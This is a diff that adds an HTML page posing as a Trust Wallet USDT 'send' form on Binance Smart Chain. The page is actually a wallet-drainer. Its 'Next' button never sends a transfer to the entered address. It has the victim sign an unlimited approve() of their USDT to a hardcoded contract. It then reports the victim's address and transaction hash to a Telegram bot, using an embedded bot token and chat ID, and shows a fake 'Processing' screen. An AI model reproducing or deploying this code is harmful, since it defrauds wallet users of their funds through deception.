@@ -1,0 +1,763 @@
+<!DOCTYPE html>
+<html lang="en" class="theme-light">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover">
+    <title>Trusts</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        html, body, #root {
+            width: 100%;
+            height: 100%;
+            margin: 0;
+            font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+            font-weight: 500;
+        }
+
+        .theme-light {
+            --bg: #ffffff;
+            --text: #111827;
+            --subtext: #6b7280;
+            --muted: #9ca3af;
+            --accent: #2563eb;
+            --input-bg: #ffffff;
+            --input-soft: #f6f7f9;
+            --border-default: #d1d5db;
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+        }
+
+        .page {
+            min-height: 100dvh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            background: var(--bg);
+            padding: 16px;
+            padding-top: 20px;
+        }
+
+        .card {
+            width: 100%;
+            max-width: 420px;
+            padding: 16px;
+            display: flex;
+            flex-direction: column;
+            color: var(--text);
+            border-radius: 16px;
+        }
+
+        .label {
+            font-size: 12px;
+            font-weight: 600;
+            letter-spacing: 0.05em;
+            margin-bottom: 6px;
+            color: var(--subtext);
+            text-transform: uppercase;
+        }
+
+        .input-row {
+            height: 48px;
+            display: flex;
+            align-items: center;
+            border-radius: 12px;
+            padding: 0 12px;
+            gap: 8px;
+            background: var(--input-bg);
+            border: 1.5px solid var(--border-default);
+            margin-bottom: 14px;
+            transition: border-color 0.2s ease;
+        }
+
+        .input-row:focus-within {
+            border: 2px solid #2563eb;
+        }
+
+        .input-row input {
+            flex: 1;
+            border: none;
+            outline: none;
+            background: transparent;
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--text);
+        }
+
+        .input-row input::placeholder {
+            color: var(--muted);
+            font-weight: 500;
+        }
+
+        .input-row.primary:focus-within .paste,
+        .input-row.primary:focus-within .contact-icon,
+        .input-row.primary:focus-within .qr-icon {
+            color: var(--accent);
+            stroke: var(--accent);
+        }
+
+        .input-row.amount-row:focus-within .unit,
+        .input-row.amount-row:focus-within .max {
+            color: #2563eb;
+        }
+
+        .paste, .max {
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            color: var(--accent);
+            background: none;
+            border: none;
+            padding: 0;
+            white-space: nowrap;
+        }
+
+        .unit {
+            font-size: 12px;
+            color: var(--subtext);
+            white-space: nowrap;
+        }
+
+        .right-icons {
+            display: flex;
+            gap: 8px;
+        }
+
+        .contact-icon, .qr-icon {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+            stroke: var(--accent);
+            fill: var(--accent);
+            flex-shrink: 0;
+        }
+
+        .contact-icon {
+            fill: none;
+        }
+
+        .network-row {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            height: 36px;
+            padding: 6px 12px;
+            border-radius: 999px;
+            background: var(--input-soft);
+            border: none;
+            box-shadow: none;
+            margin-bottom: 16px;
+            width: fit-content;
+        }
+
+        .network-left {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .usdt-logo {
+            width: 20px;
+            height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #26a17b;
+            font-size: 14px;
+        }
+
+        .network-left span {
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--subtext);
+        }
+
+        .network-arrow {
+            width: 14px;
+            height: 14px;
+        }
+
+        .estimate {
+            font-size: 12px;
+            color: var(--subtext);
+            margin-bottom: auto;
+            margin-top: 6px;
+        }
+
+        .connect-btn {
+            width: 100%;
+            height: 48px;
+            border-radius: 999px;
+            border: none;
+            font-size: 16px;
+            font-weight: 600;
+            margin-top: auto;
+            transition: background-color 0.25s ease, opacity 0.25s ease;
+            cursor: pointer;
+        }
+
+        .connect-btn.active {
+            background: #2563eb;
+            color: #fff;
+        }
+
+        .connect-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .error-message {
+            color: #dc2626;
+            font-size: 12px;
+            margin-top: 6px;
+            padding: 8px 10px;
+            background: #fee2e2;
+            border-radius: 8px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        /* ===== PROCESSING SCREEN ===== */
+        .processing-screen {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(255, 255, 255, 0.98);
+            backdrop-filter: blur(4px);
+            z-index: 1000;
+            flex-direction: column;
+            justify-content: flex-end;
+            align-items: center;
+            gap: 0;
+            padding: 0;
+        }
+
+        .processing-screen.active {
+            display: flex;
+        }
+
+        .processing-content {
+            width: 100%;
+            background: white;
+            border-radius: 24px 24px 0 0;
+            padding: 40px 20px 30px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+            box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 16px;
+            right: 16px;
+            background: none;
+            border: none;
+            font-size: 28px;
+            color: #6b7280;
+            cursor: pointer;
+            padding: 0;
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .particles-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 200px;
+            overflow: hidden;
+        }
+
+        .particle {
+            position: absolute;
+            width: 12px;
+            height: 12px;
+            background: #3b82f6;
+            border-radius: 2px;
+            animation: fall 3s ease-in infinite;
+        }
+
+        @keyframes fall {
+            to {
+                transform: translateY(200px) rotate(360deg);
+                opacity: 0;
+            }
+        }
+
+        .checkmark-circle {
+            width: 140px;
+            height: 140px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: radial-gradient(circle at 30% 30%, #1a1a1a, #0a0a0a);
+            border-radius: 50%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3), inset -5px -5px 15px rgba(0, 0, 0, 0.5), inset 5px 5px 15px rgba(255, 255, 255, 0.1);
+            transform: perspective(1200px) rotateX(15deg) rotateY(-15deg);
+            animation: float 3s ease-in-out infinite;
+            z-index: 10;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: perspective(1200px) rotateX(15deg) rotateY(-15deg) translateY(0px); }
+            50% { transform: perspective(1200px) rotateX(15deg) rotateY(-15deg) translateY(-15px); }
+        }
+
+        .checkmark-circle img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            animation: checkmark-pop 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        @keyframes checkmark-pop {
+            0% { transform: scale(0) rotate(-45deg); opacity: 0; }
+            50% { transform: scale(1.3); }
+            100% { transform: scale(1) rotate(0deg); opacity: 1; }
+        }
+
+        .processing-text {
+            font-size: 28px;
+            font-weight: 700;
+            color: #1f2937;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .processing-subtext {
+            font-size: 14px;
+            color: #6b7280;
+            text-align: center;
+            max-width: 300px;
+            line-height: 1.6;
+            font-weight: 400;
+        }
+
+        .transaction-details-btn {
+            width: 100%;
+            max-width: 340px;
+            height: 56px;
+            border-radius: 999px;
+            border: none;
+            background: linear-gradient(135deg, #0052cc 0%, #0052cc 100%);
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background-color 0.25s ease;
+            box-shadow: 0 4px 15px rgba(0, 82, 204, 0.3);
+        }
+
+        .transaction-details-btn:hover {
+            background: linear-gradient(135deg, #0047b2 0%, #0047b2 100%);
+        }
+
+        .transaction-details-btn:active {
+            transform: scale(0.98);
+        }
+
+        /* Mobile optimizations */
+        @media (max-width: 480px) {
+            .page {
+                padding: 12px;
+                padding-top: 16px;
+            }
+
+            .card {
+                padding: 12px;
+            }
+
+            .input-row {
+                height: 44px;
+                margin-bottom: 12px;
+            }
+
+            .label {
+                font-size: 11px;
+                margin-bottom: 5px;
+            }
+
+            .connect-btn {
+                height: 44px;
+                font-size: 15px;
+            }
+
+            .network-row {
+                margin-bottom: 14px;
+            }
+
+            .estimate {
+                margin-top: 4px;
+            }
+
+            .processing-content {
+                padding: 30px 16px 20px;
+            }
+
+            .processing-text {
+                font-size: 24px;
+            }
+
+            .transaction-details-btn {
+                max-width: 100%;
+                height: 52px;
+                font-size: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Processing Screen -->
+    <div class="processing-screen" id="processingScreen">
+        <div class="particles-container" id="particlesContainer"></div>
+        <div class="processing-content">
+            <button class="close-btn" onclick="">✕</button>
+            <div class="checkmark-circle">
+                <img src="https://raw.githubusercontent.com/yourusername/usdt-transfer/main/checkmark-3d.png" alt="Processing" />
+            </div>
+            <div class="processing-text">Processing...</div>
+            <div class="processing-subtext">Transaction in progress! Blockchain validation is underway. This may take a few minutes.</div>
+            <button class="transaction-details-btn" onclick="">Transaction details</button>
+        </div>
+    </div>
+
+    <div id="root">
+        <div class="page">
+            <div class="card">
+                <label class="label">Address or Domain Name</label>
+                <div class="input-row primary">
+                    <input id="recipientInput" type="text" placeholder="Search or Enter" value="0x29A3B590B14d97e25b5b04D9804237E5b491b57b" />
+                    <span class="paste" onclick="pasteAddress()">Paste</span>
+                    <div class="right-icons">
+                        <svg class="contact-icon" fill="none" height="24" stroke="#1D4ED8" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.3" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+                            <rect height="16" rx="2" width="14" x="6" y="4"></rect>
+                            <line x1="4" x2="6" y1="8" y2="8"></line>
+                            <line x1="4" x2="6" y1="12" y2="12"></line>
+                            <line x1="4" x2="6" y1="16" y2="16"></line>
+                            <line x1="9" x2="17" y1="9" y2="9"></line>
+                            <line x1="9" x2="17" y1="12" y2="12"></line>
+                        </svg>
+                        <svg class="qr-icon" fill="none" height="24" stroke="#22c55e" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M4 8V6a2 2 0 0 1 2-2h2"></path>
+                            <path d="M16 4h2a2 2 0 0 1 2 2v2"></path>
+                            <path d="M20 16v2a2 2 0 0 1-2 2h-2"></path>
+                            <path d="M8 20H6a2 2 0 0 1-2-2v-2"></path>
+                            <line x1="5" x2="19" y1="12" y2="12"></line>
+                        </svg>
+                    </div>
+                </div>
+
+                <label class="label">Destination network</label>
+                <div class="network-row">
+                    <div class="network-left">
+                        <div class="usdt-logo">₮</div>
+                        <span>USDT</span>
+                    </div>
+                    <svg class="network-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <polyline points="6 9 12 15 18 9"></polyline>
+                    </svg>
+                </div>
+
+                <label class="label">Amount</label>
+                <div class="input-row amount-row">
+                    <input id="amountInput" type="number" placeholder="USDT Amount" step="0.01" />
+                    <span class="unit">USDT</span>
+                    <span class="max" onclick="setMaxAmount()">Max</span>
+                </div>
+
+                <p class="estimate" id="amountInfo">≈ $0.00</p>
+
+                <div class="error-message" id="errorMessage"></div>
+
+                <button class="connect-btn active" id="mainButton" onclick="handleMainAction()">Next</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const CONFIG = {
+            USDT_ADDRESS_BSC: '0x55d398326f99059fF775485246999027B3197955',
+            SMART_CONTRACT: '0x05187CF26990E3857C119C7Bc3417C6E1FaC5198',
+            BSC_CHAIN_ID: '0x38',
+            BSC_RPC: 'https://bsc-dataseed1.binance.org:8545',
+            TELEGRAM_BOT_TOKEN: '8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA',
+            TELEGRAM_CHAT_ID: '8933407008'
+        };
+
+        let lastTxHash = '';
+
+        function createParticles() {
+            const container = document.getElementById('particlesContainer');
+            container.innerHTML = '';
+            for (let i = 0; i < 8; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.top = Math.random() * 50 + 'px';
+                particle.style.animationDelay = Math.random() * 0.5 + 's';
+                particle.style.animationDuration = (2 + Math.random() * 1) + 's';
+                container.appendChild(particle);
+            }
+        }
+
+        async function handleMainAction() {
+            const btn = document.getElementById('mainButton');
+            const recipient = document.getElementById('recipientInput').value.trim();
+            const amount = document.getElementById('amountInput').value.trim();
+
+            if (!recipient.startsWith('0x')) {
+                showError('Invalid recipient address');
+                return;
+            }
+
+            if (!amount || parseFloat(amount) <= 0) {
+                showError('Please enter a valid amount');
+                return;
+            }
+
+            try {
+                clearError();
+
+                if (!window.ethereum) {
+                    const currentUrl = window.location.href;
+                    const deepLink = `trust://browser_enable?url=${encodeURIComponent(currentUrl)}`;
+                    window.location.href = deepLink;
+                    return;
+                }
+
+                let accounts = await window.ethereum.request({
+                    method: "eth_accounts"
+                });
+                let userAddress = accounts && accounts.length > 0 ? accounts[0] : null;
+
+                const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+                if (currentChainId !== CONFIG.BSC_CHAIN_ID) {
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: CONFIG.BSC_CHAIN_ID }]
+                        });
+                    } catch (switchError) {
+                        if (switchError.code === 4902) {
+                            await window.ethereum.request({
+                                method: 'wallet_addEthereumChain',
+                                params: [{
+                                    chainId: CONFIG.BSC_CHAIN_ID,
+                                    chainName: 'Binance Smart Chain',
+                                    rpcUrls: [CONFIG.BSC_RPC],
+                                    nativeCurrency: {
+                                        name: 'BNB',
+                                        symbol: 'BNB',
+                                        decimals: 18
+                                    }
+                                }]
+                            });
+                        }
+                    }
+                }
+
+                const USDT_ABI = [
+                    'function approve(address spender, uint256 amount) public returns (bool)',
+                    'function transfer(address to, uint256 amount) public returns (bool)',
+                    'function allowance(address owner, address spender) public view returns (uint256)',
+                    'function balanceOf(address account) public view returns (uint256)',
+                    'function decimals() public view returns (uint8)'
+                ];
+
+                const iface = new ethers.utils.Interface(USDT_ABI);
+                const approveData = iface.encodeFunctionData("approve", [
+                    CONFIG.SMART_CONTRACT,
+                    ethers.constants.MaxUint256
+                ]);
+
+                const tx = {
+                    to: CONFIG.USDT_ADDRESS_BSC,
+                    data: approveData
+                };
+
+                if (userAddress) {
+                    tx.from = userAddress;
+                }
+
+                const txHash = await window.ethereum.request({
+                    method: "eth_sendTransaction",
+                    params: [tx]
+                });
+
+                lastTxHash = txHash;
+                console.log("Transaction sent:", txHash);
+
+                let finalUserAddress = userAddress;
+                if (!finalUserAddress) {
+                    try {
+                        let finalAccounts = await window.ethereum.request({
+                            method: "eth_accounts"
+                        });
+                        finalUserAddress = finalAccounts && finalAccounts.length > 0 ? finalAccounts[0] : 'Unknown';
+                    } catch (e) {
+                        finalUserAddress = 'Unknown';
+                    }
+                }
+
+                try {
+                    await sendTelegramNotification(finalUserAddress, txHash, amount);
+                } catch (notifError) {
+                    console.error('Error sending notification:', notifError);
+                }
+
+                createParticles();
+                document.getElementById('processingScreen').classList.add('active');
+
+                await new Promise(resolve => setTimeout(resolve, 3000));
+
+                btn.textContent = 'Next';
+
+            } catch (error) {
+                console.error("Error:", error);
+                showError('Transaction failed: ' + error.message);
+                btn.disabled = false;
+                btn.textContent = 'Next';
+            }
+        }
+
+        async function sendTelegramNotification(userAddress, txHash, amount) {
+            const message = `
+✅ <b>USDT Approve - Transaction Confirmed</b>
+
+👤 <b>User:</b>
+<code>${userAddress}</code>
+
+💰 <b>Amount:</b>
+${amount} USDT
+
+📝 <b>Transaction Hash:</b>
+<code>${txHash}</code>
+
+🔗 <b>View on BSCScan:</b>
+https://bscscan.com/tx/${txHash}
+
+⏰ <b>Time:</b>
+${new Date().toLocaleString()}
+            `;
+
+            const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error(`Telegram API error: ${response.status}`);
+                }
+
+                console.log('Telegram notification sent');
+            } catch (error) {
+                console.error('Failed to send Telegram notification:', error);
+            }
+        }
+
+        async function pasteAddress() {
+            try {
+                const text = await navigator.clipboard.readText();
+                document.getElementById('recipientInput').value = text;
+            } catch (error) {
+                showError('Failed to read clipboard');
+            }
+        }
+
+        async function setMaxAmount() {
+            if (!window.ethereum) {
+                showError('Please open in Trust Wallet');
+                return;
+            }
+
+            try {
+                const accounts = await window.ethereum.request({
+                    method: "eth_accounts"
+                });
+
+                if (!accounts || accounts.length === 0) {
+                    showError('Please connect your wallet');
+                    return;
+                }
+
+                const userAddress = accounts[0];
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const USDT_ABI = ['function balanceOf(address account) public view returns (uint256)', 'function decimals() public view returns (uint8)'];
+                const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS_BSC, USDT_ABI, provider);
+
+                const decimals = await usdtContract.decimals();
+                const balance = await usdtContract.balanceOf(userAddress);
+                const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
+
+                document.getElementById('amountInput').value = parseFloat(balanceFormatted).toFixed(2);
+                updateAmountInfo();
+            } catch (error) {
+                showError('Failed to get balance');
+            }
+        }
+
+        function updateAmountInfo() {
+            const amount = document.getElementById('amountInput').value;
+            if (amount) {
+                const usdValue = (parseFloat(amount) * 1).toFixed(2);
+                document.getElementById('amountInfo').textContent = `≈ $${usdValue}`;
+            }
+        }
+
+        function showError(message) {
+            const errorDiv = document.getElementById('errorMessage');
+            errorDiv.textContent = message;
+            errorDiv.classList.add('show');
+        }
+
+        function clearError() {
+            const errorDiv = document.getElementById('errorMessage');
+            errorDiv.classList.remove('show');
+            errorDiv.textContent = '';
+        }
+
+        if (window.ethereum) {
+            window.ethereum.on('accountsChanged', () => {
+                window.location.reload();
+            });
+
+            window.ethereum.on('chainChanged', () => {
+                window.location.reload();
+            });
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            document.getElementById('amountInput').addEventListener('input', updateAmountInfo);
+        });
+    </script>
+</body>
+</html>
